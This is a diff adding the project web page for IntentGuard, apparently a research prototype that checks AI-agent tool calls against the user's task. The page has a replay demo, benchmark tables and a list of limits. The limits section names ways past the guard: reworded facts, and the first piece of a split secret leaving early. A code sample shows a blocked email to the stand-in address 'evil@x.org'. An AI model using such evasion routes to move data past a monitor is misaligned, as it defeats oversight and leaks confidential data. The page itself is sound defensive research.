@@ -1,0 +1,398 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>IntentGuard: runtime authorization for AI agents</title>
+<meta name="description" content="A research prototype that checks every tool call an AI agent makes against what the user actually asked for, before it runs. Replay real decisions from the engine.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Cpath d='M16 3l11 4v8c0 7-5 12-11 14C10 27 5 22 5 15V7z' fill='%231f4fd8'/%3E%3Cpath d='M11 16l4 4 7-8' fill='none' stroke='%23fff' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E">
+<style>
+:root {
+  --bg: #f5f3ee; --surface: #fffdf8; --ink: #1c1e22; --muted: #565a61; --line: #d9d4c8; --accent: #1f4fd8;
+  --accent-ink: #ffffff; --code: #ebe7dc;
+  --allow: #17653f; --allow-bg: #e1f1e8; --review: #7c4a00; --review-bg: #fbeed3;
+  --block: #a1241a; --block-bg: #fbe3df; --quar: #55267f; --quar-bg: #eee3f7;
+  --serif: ui-serif, Charter, "Iowan Old Style", "Palatino Linotype", Georgia, serif;
+  --sans: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+  --mono: ui-monospace, "Cascadia Code", "SF Mono", Menlo, Consolas, monospace;
+  --s1: 4px; --s2: 8px; --s3: 12px; --s4: 16px; --s5: 24px; --s6: 32px; --s7: 48px; --s8: 72px;
+  --radius: 10px;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #101215; --surface: #181b20; --ink: #ecebe6; --muted: #a4a8af; --line: #2c3037; --accent: #86a8ff;
+    --accent-ink: #0b1020; --code: #20242b;
+    --allow: #78d6a2; --allow-bg: #12291e; --review: #f1bd62; --review-bg: #2e2209;
+    --block: #ff9489; --block-bg: #351715; --quar: #cfa9f2; --quar-bg: #281836;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #101215; --surface: #181b20; --ink: #ecebe6; --muted: #a4a8af; --line: #2c3037; --accent: #86a8ff;
+  --accent-ink: #0b1020; --code: #20242b;
+  --allow: #78d6a2; --allow-bg: #12291e; --review: #f1bd62; --review-bg: #2e2209;
+  --block: #ff9489; --block-bg: #351715; --quar: #cfa9f2; --quar-bg: #281836;
+}
+* { box-sizing: border-box; }
+html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
+body { margin: 0; background: var(--bg); color: var(--ink); font: 16px/1.6 var(--sans); }
+a { color: var(--accent); text-underline-offset: 3px; }
+:focus-visible { outline: 3px solid var(--accent); outline-offset: 2px; border-radius: 4px; }
+.skip { position: absolute; left: var(--s4); top: -64px; background: var(--accent); color: var(--accent-ink); padding: var(--s3) var(--s4); border-radius: 6px; z-index: 10; }
+.skip:focus { top: var(--s3); }
+.wrap { max-width: 1080px; margin: 0 auto; padding: 0 var(--s4); }
+header.top { border-bottom: 1px solid var(--line); }
+header.top .wrap { display: flex; align-items: center; justify-content: space-between; gap: var(--s4); min-height: 60px; flex-wrap: wrap; }
+.brand { min-height: 44px; font: 700 18px/1 var(--serif); letter-spacing: .2px; display: flex; align-items: center; gap: var(--s2); color: var(--ink); text-decoration: none; }
+nav.links { display: flex; gap: var(--s1); flex-wrap: wrap; align-items: center; }
+nav.links a, .btn-ghost { min-height: 44px; display: inline-flex; align-items: center; padding: 0 var(--s3); color: var(--ink); text-decoration: none; border-radius: 8px; font-size: 15px; }
+nav.links a:hover, .btn-ghost:hover { background: var(--code); }
+.btn-ghost { background: none; border: 0; font: inherit; font-size: 15px; cursor: pointer; }
+h1, h2, h3 { font-family: var(--serif); line-height: 1.2; margin: 0; }
+h1 { font-size: clamp(30px, 5vw, 46px); letter-spacing: -.01em; }
+h2 { font-size: clamp(24px, 3.4vw, 32px); margin-bottom: var(--s3); }
+h3 { font-size: 19px; }
+section { padding: var(--s7) 0 0; }
+.lede { font-size: 18px; color: var(--muted); max-width: 66ch; margin: var(--s3) 0 0; }
+.hero { padding: var(--s5) 0 0; }
+#demo { padding-top: var(--s5); }
+.kicker { font: 600 13px/1 var(--sans); letter-spacing: .08em; text-transform: uppercase; color: var(--muted); margin-bottom: var(--s3); }
+.note { border-left: 4px solid var(--review); background: var(--review-bg); padding: var(--s3) var(--s4); border-radius: 0 8px 8px 0; font-size: 15px; max-width: 78ch; }
+.note b { color: var(--review); }
+
+/* demo */
+.demo { display: grid; gap: var(--s5); margin-top: var(--s5); grid-template-columns: 1fr; }
+@media (min-width: 860px) { .demo { grid-template-columns: 320px 1fr; align-items: start; } .scenarios { position: sticky; top: var(--s4); } }
+.scenarios { display: grid; gap: var(--s2); margin: 0; padding: 0; list-style: none; }
+.scenarios button { width: 100%; text-align: left; min-height: 44px; padding: var(--s3) var(--s4); border: 1px solid var(--line); background: var(--surface); color: var(--ink); border-radius: var(--radius); font: inherit; cursor: pointer; display: grid; gap: 2px; }
+.scenarios button:hover { border-color: var(--accent); }
+.scenarios button[aria-pressed="true"] { border-color: var(--accent); box-shadow: inset 4px 0 0 var(--accent); background: var(--surface); }
+.scenarios .t { font-weight: 600; font-size: 15px; }
+.tag { font: 600 12px/1.4 var(--sans); letter-spacing: .04em; text-transform: uppercase; color: var(--muted); }
+.tag.attack { color: var(--block); } .tag.normal { color: var(--allow); } .tag.limit { color: var(--review); }
+.panel { background: var(--surface); border: 1px solid var(--line); border-radius: var(--radius); padding: var(--s5); min-width: 0; }
+.panel .blurb { color: var(--muted); margin: var(--s1) 0 var(--s4); }
+.task { background: var(--code); border-radius: 8px; padding: var(--s3) var(--s4); font-size: 15px; }
+.task span { display: block; font: 600 12px/1.4 var(--sans); letter-spacing: .06em; text-transform: uppercase; color: var(--muted); }
+.controls { display: flex; gap: var(--s2); flex-wrap: wrap; margin: var(--s4) 0; }
+.btn { min-height: 44px; padding: 0 var(--s4); border-radius: 8px; border: 1px solid var(--line); background: var(--surface); color: var(--ink); font: 600 15px var(--sans); cursor: pointer; }
+.btn.primary { background: var(--accent); color: var(--accent-ink); border-color: var(--accent); }
+.btn:disabled { opacity: .45; cursor: default; }
+.steps { list-style: none; margin: 0; padding: 0; display: grid; gap: var(--s3); }
+.step { border: 1px solid var(--line); border-radius: var(--radius); padding: var(--s3) var(--s4); display: grid; gap: var(--s2); animation: in .18s ease-out; }
+.step.ALLOW { border-left: 6px solid var(--allow); } .step.REVIEW { border-left: 6px solid var(--review); }
+.step.BLOCK { border-left: 6px solid var(--block); } .step.QUARANTINE { border-left: 6px solid var(--quar); }
+@keyframes in { from { opacity: 0; transform: translateY(6px); } to { opacity: 1; transform: none; } }
+.call { font: 14px/1.5 var(--mono); overflow-wrap: anywhere; }
+.row { display: flex; align-items: center; gap: var(--s3); flex-wrap: wrap; }
+.badge { display: inline-flex; align-items: center; gap: 6px; font: 700 13px/1 var(--sans); letter-spacing: .04em; padding: 6px 10px; border-radius: 999px; }
+.badge svg { width: 14px; height: 14px; flex: none; }
+.badge.ALLOW { color: var(--allow); background: var(--allow-bg); } .badge.REVIEW { color: var(--review); background: var(--review-bg); }
+.badge.BLOCK { color: var(--block); background: var(--block-bg); } .badge.QUARANTINE { color: var(--quar); background: var(--quar-bg); }
+.ran { font-size: 14px; color: var(--muted); }
+.rules { margin: 0; padding-left: var(--s4); font-size: 14px; color: var(--ink); }
+.rules code { font: 12px var(--mono); background: var(--code); padding: 1px 6px; border-radius: 4px; margin-right: 6px; }
+.risk { display: flex; align-items: center; gap: var(--s3); font-size: 13px; color: var(--muted); }
+.risk .bar { flex: 1; max-width: 220px; height: 8px; background: var(--code); border-radius: 99px; overflow: hidden; }
+.risk .bar i { display: block; height: 100%; background: var(--accent); }
+.empty { color: var(--muted); border: 1px dashed var(--line); border-radius: var(--radius); padding: var(--s5); text-align: center; }
+.verdict-note { margin-top: var(--s4); padding: var(--s3) var(--s4); border-radius: 8px; background: var(--code); font-size: 15px; }
+
+/* how it works */
+.checks { counter-reset: c; display: grid; gap: var(--s4); grid-template-columns: repeat(auto-fit, minmax(190px, 1fr)); list-style: none; padding: 0; margin: var(--s5) 0 0; }
+.checks li { counter-increment: c; border-top: 3px solid var(--ink); padding-top: var(--s3); }
+.checks li::before { content: counter(c, decimal-leading-zero); font: 600 13px var(--mono); color: var(--muted); display: block; margin-bottom: var(--s1); }
+.checks b { display: block; font-family: var(--serif); font-size: 18px; margin-bottom: var(--s1); }
+.checks span { color: var(--muted); font-size: 15px; }
+.ladder { display: flex; flex-wrap: wrap; gap: var(--s2); margin: var(--s5) 0 0; padding: 0; list-style: none; }
+.ladder li { border: 1px solid var(--line); background: var(--surface); border-radius: 8px; padding: var(--s2) var(--s3); font-size: 14px; }
+.ladder b { font-family: var(--mono); }
+
+/* results */
+.tablewrap { overflow-x: auto; margin-top: var(--s4); border: 1px solid var(--line); border-radius: var(--radius); background: var(--surface); }
+table { border-collapse: collapse; width: 100%; min-width: 640px; font-size: 15px; }
+th, td { text-align: left; padding: var(--s3) var(--s4); border-bottom: 1px solid var(--line); vertical-align: middle; }
+th { font: 600 13px/1.3 var(--sans); color: var(--muted); letter-spacing: .03em; }
+tr:last-child td { border-bottom: 0; }
+td.num { font-variant-numeric: tabular-nums; white-space: nowrap; }
+tr.me td { background: color-mix(in srgb, var(--accent) 9%, transparent); font-weight: 600; }
+.asrbar { display: flex; align-items: center; gap: var(--s2); min-width: 190px; }
+.asrbar .track { flex: 1; height: 10px; background: var(--code); border-radius: 99px; overflow: hidden; }
+.asrbar .track i { display: block; height: 100%; background: var(--block); min-width: 2px; }
+tr.me .asrbar .track i { background: var(--allow); }
+.setpick { display: flex; flex-wrap: wrap; gap: var(--s2); margin-top: var(--s4); }
+.setpick button { min-height: 44px; padding: 0 var(--s3); border: 1px solid var(--line); background: var(--surface); color: var(--ink); border-radius: 8px; font: 14px var(--sans); cursor: pointer; }
+.setpick button[aria-pressed="true"] { border-color: var(--accent); box-shadow: inset 0 -3px 0 var(--accent); font-weight: 600; }
+.small { font-size: 14px; color: var(--muted); }
+
+ul.limits { padding-left: var(--s5); max-width: 78ch; } ul.limits li { margin: var(--s2) 0; }
+pre { background: var(--code); border-radius: var(--radius); padding: var(--s4); overflow-x: auto; font: 13.5px/1.6 var(--mono); margin: var(--s3) 0 0; }
+.codewrap { position: relative; }
+.copy { position: absolute; top: var(--s2); right: var(--s2); min-height: 44px; padding: 0 var(--s3); font-size: 13px; }
+.codewrap pre { padding-right: 96px; }
+footer { margin-top: var(--s8); border-top: 1px solid var(--line); padding: var(--s5) 0 var(--s7); color: var(--muted); font-size: 14px; }
+.sr { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0 0 0 0); white-space: nowrap; }
+@media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } .step { animation: none; } }
+@media (max-width: 520px) { .panel { padding: var(--s4); } section { padding-top: var(--s6); } }
+</style>
+</head>
+<body>
+<a class="skip" href="#demo">Skip to the demo</a>
+<header class="top">
+  <div class="wrap">
+    <a class="brand" href="#top" id="top">
+      <svg width="24" height="24" viewBox="0 0 32 32" aria-hidden="true"><path d="M16 3l11 4v8c0 7-5 12-11 14C10 27 5 22 5 15V7z" fill="currentColor"/><path d="M11 16l4 4 7-8" fill="none" stroke="var(--bg)" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      IntentGuard
+    </a>
+    <nav class="links" aria-label="Page sections">
+      <a href="#demo">Demo</a><a href="#how">How it works</a><a href="#results">Results</a><a href="#limits">Limits</a><a href="#try">Try it</a>
+      <a id="repo" href="#">GitHub</a>
+      <button class="btn-ghost" id="theme" type="button" aria-label="Switch colour theme">Theme</button>
+    </nav>
+  </div>
+</header>
+
+<main>
+<div class="wrap">
+  <div class="hero">
+    <p class="kicker">Research prototype</p>
+    <h1>Check what an AI agent is about to do against what you actually asked for.</h1>
+    <p class="lede">IntentGuard sits between an agent and its tools. Before each call runs, it compares the call with the user's task, the data involved, the destination, and what the session has already done.</p>
+  </div>
+
+  <section id="demo" aria-labelledby="demo-h">
+    <h2 id="demo-h">Replay real decisions</h2>
+    <p class="small" style="margin:0;max-width:70ch">Pick a situation, then run the agent's calls one at a time. Every verdict below was produced by the actual engine on synthetic files and a mock inbox; nothing is typed in by hand.</p>
+    <div class="demo">
+      <ul class="scenarios" id="scenarios" aria-label="Situations"></ul>
+      <div class="panel" id="panel" aria-live="off">
+        <noscript><p>This replay needs JavaScript. The same decisions are in the repository under <code>site/build_site.py</code>.</p></noscript>
+      </div>
+    </div>
+    <div class="sr" role="status" aria-live="polite" id="announce"></div>
+  </section>
+
+  <section id="how" aria-labelledby="how-h">
+    <h2 id="how-h">How a call is judged</h2>
+    <p class="lede" style="margin-top:0">Plain rules, no model in the loop, so the same call in the same state always gets the same answer and every answer names the rule behind it.</p>
+    <ol class="checks">
+      <li><b>The task</b><span>Is this file, action and destination part of what the user asked? Anything outside the task is stopped.</span></li>
+      <li><b>The data</b><span>Public, internal, confidential or secret. A task cannot reach above the level it was granted.</span></li>
+      <li><b>The destination</b><span>Local, approved, unknown or denylisted. Unknown places need a person.</span></li>
+      <li><b>Where it came from</b><span>Content that left a sensitive file is recognised on the way out, even re-typed, encoded or split.</span></li>
+      <li><b>The session so far</b><span>Each suspicious step adds risk. Risk switches off abilities in stages.</span></li>
+    </ol>
+    <p class="small" style="margin-top:var(--s5)">Risk ladder (default settings), from the engine's own configuration:</p>
+    <ul class="ladder" id="ladder"></ul>
+    <p class="small">Every decision is written to a hash-chained audit log, so editing or deleting an entry afterwards is detectable.</p>
+  </section>
+
+  <section id="results" aria-labelledby="res-h">
+    <h2 id="res-h">What the benchmark says, and how far to trust it</h2>
+    <div class="note"><b>Preliminary.</b> The attack sets were written by the same person who built the engine, and a scripted agent plays them in a synthetic environment. They show the engine does what its author intended, not how it fares against an outside attacker. Rows marked "stand-in" are my deterministic re-creations of an idea from a paper, not the published systems.</div>
+    <div class="setpick" id="setpick" role="group" aria-label="Choose an attack set"></div>
+    <p class="small" id="setinfo" style="margin:var(--s3) 0 0"></p>
+    <div class="tablewrap">
+      <table>
+        <caption class="sr">Harmful steps that run, and the cost to legitimate work, per system on the chosen set</caption>
+        <thead><tr><th scope="col">System</th><th scope="col">Harmful steps that run (lower is better)</th><th scope="col">Legitimate steps blocked</th><th scope="col">Legitimate tasks finished untouched</th></tr></thead>
+        <tbody id="restable"></tbody>
+      </table>
+    </div>
+    <p class="small">Numbers come from <code>python -m bench.run</code> at commit <code>__RESULTS_COMMIT__</code>. Brackets are 95% confidence intervals. "Finished untouched" is the share of legitimate tasks in which no step was blocked or sent for review, so a system that blocks everything is not a good answer. The first column counts individual harmful steps, not whole attacks.</p>
+  </section>
+
+  <section id="limits" aria-labelledby="lim-h">
+    <h2 id="lim-h">What it does not do</h2>
+    <ul class="limits">
+      <li><b>Reworded facts get through.</b> A rounded figure, another language, slang, or a comparison with no numbers is not recognised (5 of 14 attacks in the newest set are known misses).</li>
+      <li><b>The first short piece of a split secret can leave</b> before the whole is recognisable, as the replay above shows.</li>
+      <li><b>No independent test yet.</b> Every attack set shares an author with the engine. An outside set is the next step for the evidence.</li>
+      <li><b>Some friction.</b> About 4.5% of steps on the held-out generated set go to a human, and a legitimate email that repeats a sensitive number will too.</li>
+      <li><b>Not compared with the real systems.</b> Progent, The Task Shield and CaMeL are represented only by stand-ins that capture one idea each.</li>
+      <li><b>Mock tools.</b> The tools in these runs are synthetic. Network-level isolation of a real agent is not verified.</li>
+    </ul>
+    <p class="small">The full list, with the measurements behind each, is in <a id="findings" href="#">docs/findings.md</a>.</p>
+  </section>
+
+  <section id="try" aria-labelledby="try-h">
+    <h2 id="try-h">Try it</h2>
+    <p class="small" style="margin:0">Run the service with the dashboard backend, or guard your own Python functions in a few lines.</p>
+    <div class="codewrap"><pre id="code1"><code>git clone <span data-repo></span>
+cd IntentGuard
+pip install -e ".[dev]"
+intentguard serve --demo        # http://127.0.0.1:8000
+python -m pytest -q</code></pre><button class="btn copy" type="button" data-copy="code1">Copy</button></div>
+    <div class="codewrap"><pre id="code2"><code>from intentguard.sdk import Guard
+
+guard = Guard(classes={"hr/salary.csv": "CONFIDENTIAL"}, trust={"bob@x.org": "approved"})
+
+@guard.tool("read", resource_arg="path")
+def read_file(path): ...
+
+@guard.tool("send", dest_arg="to")
+def send_email(to, body): ...
+
+session = guard.session("Read notes/a.txt and email bob@x.org a summary",
+                        {"resources": ["notes/*"], "destinations": ["bob@x.org"]})
+session.call("send_email", to="evil@x.org", body="...")   # blocked, with the reason</code></pre><button class="btn copy" type="button" data-copy="code2">Copy</button></div>
+  </section>
+</div>
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>IntentGuard is a research prototype, not a product, and has not been audited. Built from commit <code>__BUILD__</code>. The replay is generated by <code>site/build_site.py</code> from the real engine; the page loads no external files and sends nothing anywhere.</p>
+  </div>
+</footer>
+
+<script type="application/json" id="data">__DATA__</script>
+<script>
+(function () {
+  "use strict";
+  var D = JSON.parse(document.getElementById("data").textContent);
+  var $ = function (id) { return document.getElementById(id); };
+  var ICON = {
+    ALLOW: '<svg viewBox="0 0 16 16" aria-hidden="true"><path d="M3 8.5l3.2 3.2L13 4.8" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>',
+    REVIEW: '<svg viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="6" fill="none" stroke="currentColor" stroke-width="2"/><path d="M8 4.8V8.4l2.2 1.4" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>',
+    BLOCK: '<svg viewBox="0 0 16 16" aria-hidden="true"><circle cx="8" cy="8" r="6" fill="none" stroke="currentColor" stroke-width="2"/><path d="M4 12L12 4" stroke="currentColor" stroke-width="2"/></svg>',
+    QUARANTINE: '<svg viewBox="0 0 16 16" aria-hidden="true"><rect x="3" y="7" width="10" height="6.5" rx="1.5" fill="none" stroke="currentColor" stroke-width="2"/><path d="M5.2 7V5.2a2.8 2.8 0 015.6 0V7" fill="none" stroke="currentColor" stroke-width="2"/></svg>'
+  };
+  var WORD = { ALLOW: "Allowed", REVIEW: "Needs a person", BLOCK: "Blocked", QUARANTINE: "Session frozen" };
+  var KIND = { attack: "Attack", normal: "Normal work", limit: "Known miss" };
+
+  function el(tag, cls, text) { var n = document.createElement(tag); if (cls) n.className = cls; if (text != null) n.textContent = text; return n; }
+  function callText(s) {
+    var parts = Object.keys(s.args).map(function (k) { return k + "=" + JSON.stringify(s.args[k]); });
+    return s.tool + "(" + parts.join(", ") + ")";
+  }
+
+  // links
+  $("repo").href = D.repo; $("findings").href = D.repo + "/blob/master/docs/findings.md";
+  document.querySelectorAll("[data-repo]").forEach(function (n) { n.textContent = D.repo + ".git"; });
+
+  // theme
+  var root = document.documentElement;
+  try { var saved = localStorage.getItem("ig-theme"); if (saved) root.setAttribute("data-theme", saved); } catch (e) {}
+  $("theme").addEventListener("click", function () {
+    var dark = root.getAttribute("data-theme") === "dark" ||
+      (!root.getAttribute("data-theme") && window.matchMedia("(prefers-color-scheme: dark)").matches);
+    var next = dark ? "light" : "dark";
+    root.setAttribute("data-theme", next);
+    try { localStorage.setItem("ig-theme", next); } catch (e) {}
+  });
+
+  // demo
+  var cur = 0, shown = 0;
+  var list = $("scenarios"), panel = $("panel"), say = $("announce");
+  D.scenarios.forEach(function (sc, i) {
+    var li = el("li"), b = el("button"); b.type = "button";
+    b.appendChild(el("span", "tag " + sc.kind, KIND[sc.kind]));
+    b.appendChild(el("span", "t", sc.title));
+    b.addEventListener("click", function () { cur = i; shown = 0; draw(); });
+    li.appendChild(b); list.appendChild(li);
+  });
+
+  function draw() {
+    var sc = D.scenarios[cur];
+    Array.prototype.forEach.call(list.querySelectorAll("button"), function (b, i) { b.setAttribute("aria-pressed", i === cur ? "true" : "false"); });
+    panel.textContent = "";
+    panel.appendChild(el("h3", null, sc.title));
+    panel.appendChild(el("p", "blurb", sc.blurb));
+    var task = el("div", "task"); task.appendChild(el("span", null, "The user's task")); task.appendChild(document.createTextNode(sc.task));
+    panel.appendChild(task);
+
+    var ctl = el("div", "controls");
+    var done = shown >= sc.steps.length;
+    var next = el("button", "btn primary", done ? "All calls run" : "Run next call");
+    next.type = "button"; next.disabled = done;
+    next.addEventListener("click", function () { shown++; draw(true); });
+    var all = el("button", "btn", "Run all"); all.type = "button"; all.disabled = done;
+    all.addEventListener("click", function () { shown = sc.steps.length; draw(true); });
+    var reset = el("button", "btn", "Reset"); reset.type = "button"; reset.disabled = shown === 0;
+    reset.addEventListener("click", function () { shown = 0; draw(); });
+    ctl.appendChild(next); ctl.appendChild(all); ctl.appendChild(reset);
+    panel.appendChild(ctl);
+
+    if (!shown) {
+      var up = sc.steps[0];
+      panel.appendChild(el("div", "empty", "The agent is about to call " + up.tool + ". Nothing has run yet."));
+      return;
+    }
+    var ol = el("ol", "steps");
+    sc.steps.slice(0, shown).forEach(function (s, i) {
+      var li = el("li", "step " + s.verdict);
+      li.appendChild(el("div", "call", (i + 1) + ". " + callText(s)));
+      var row = el("div", "row");
+      var badge = el("span", "badge " + s.verdict); badge.innerHTML = ICON[s.verdict]; badge.appendChild(document.createTextNode(WORD[s.verdict]));
+      row.appendChild(badge);
+      row.appendChild(el("span", "ran", s.ran ? (s.sent ? "The email was sent." : "The tool ran.") : "The tool did not run."));
+      li.appendChild(row);
+      if (s.returned) li.appendChild(el("div", "ran", "It returned: “" + s.returned.replace(/\n/g, " / ") + "”"));
+      if (s.rules.length) {
+        var ul = el("ul", "rules");
+        s.rules.forEach(function (r) { var it = el("li"); it.appendChild(el("code", null, r.id)); it.appendChild(document.createTextNode(r.text)); ul.appendChild(it); });
+        li.appendChild(ul);
+      }
+      var risk = el("div", "risk"); risk.appendChild(el("span", null, "Session risk " + s.risk.toFixed(2)));
+      var bar = el("span", "bar"); bar.setAttribute("aria-hidden", "true"); var fill = el("i"); fill.style.width = Math.min(100, s.risk * 100) + "%"; bar.appendChild(fill);
+      risk.appendChild(bar); li.appendChild(risk);
+      ol.appendChild(li);
+    });
+    panel.appendChild(ol);
+    if (shown >= sc.steps.length) {
+      var last = sc.steps[sc.steps.length - 1], stopped = sc.steps.some(function (s) { return !s.ran; });
+      var msg = sc.kind === "limit" ? "This one gets through. It is a documented limit, not an oversight in the demo."
+        : sc.kind === "normal" ? "Every call ran. Nothing here was slowed down."
+        : sc.id === "split" ? "The first short piece left before the pattern was visible. The second call exposed it, and the session was then frozen."
+        : sc.steps.some(function (s) { return s.verdict === "BLOCK" || s.verdict === "QUARANTINE"; }) ? "The harmful call was stopped before it ran."
+        : stopped ? "The call was held for a person to approve. It did not run, and nothing leaves until someone says yes." : "";
+      if (msg) panel.appendChild(el("div", "verdict-note", msg));
+    }
+    var s = sc.steps[shown - 1];
+    say.textContent = "Call " + shown + ": " + WORD[s.verdict] + ".";
+  }
+  draw();
+
+  // ladder
+  var NAMES = { network: "outside network off", shell: "shell off", files_locked: "files locked to the project folder", db_needs_review: "database queries need approval", quarantine: "session frozen" };
+  D.ladder.forEach(function (r) { var li = el("li"); li.appendChild(el("b", null, r.at.toFixed(1))); li.appendChild(document.createTextNode(" → " + (NAMES[r.off] || r.off))); $("ladder").appendChild(li); });
+
+  // results
+  var order = ["unprotected", "static_rbac", "keyword_guardrail_standin", "privilege_rules_standin", "task_alignment_standin", "intentguard_full"];
+  var setIdx = 2;
+  function pct(s) { var m = /^([\d.]+)%/.exec(s || ""); return m ? parseFloat(m[1]) : 0; }
+  function drawSet() {
+    var def = D.sets[setIdx], data = D.results.sets[def.id];
+    Array.prototype.forEach.call($("setpick").children, function (b, i) { b.setAttribute("aria-pressed", i === setIdx ? "true" : "false"); });
+    $("setinfo").textContent = data ? data.counts.replace(/[{}']/g, "") : "";
+    var tb = $("restable"); tb.textContent = "";
+    order.forEach(function (k) {
+      var r = data && data.rows[k]; if (!r) return;
+      var tr = el("tr", k === "intentguard_full" ? "me" : "");
+      var th = el("th", null, D.labels[k]); th.scope = "row"; th.style.font = "inherit"; th.style.color = "inherit"; th.style.letterSpacing = "0"; tr.appendChild(th);
+      var td = el("td"), wrap = el("div", "asrbar"), track = el("span", "track"), fill = el("i");
+      fill.style.width = pct(r.asr) + "%"; track.appendChild(fill); wrap.appendChild(track);
+      wrap.appendChild(el("span", "num", r.asr.split(" ")[0])); td.appendChild(wrap); tr.appendChild(td);
+      tr.appendChild(el("td", "num", r.fpr.split(" ")[0])); tr.appendChild(el("td", "num", r.completion));
+      tb.appendChild(tr);
+    });
+  }
+  D.sets.forEach(function (s, i) {
+    var b = el("button", null, s.label); b.type = "button";
+    b.addEventListener("click", function () { setIdx = i; drawSet(); });
+    $("setpick").appendChild(b);
+  });
+  drawSet();
+
+  // copy buttons
+  document.querySelectorAll("[data-copy]").forEach(function (b) {
+    b.addEventListener("click", function () {
+      var text = $(b.getAttribute("data-copy")).textContent;
+      var ok = function () { b.textContent = "Copied"; setTimeout(function () { b.textContent = "Copy"; }, 1500); };
+      try { navigator.clipboard.writeText(text).then(ok, function () { b.textContent = "Select and copy"; }); } catch (e) { b.textContent = "Select and copy"; }
+    });
+  });
+})();
+</script>
+</body>
+</html>
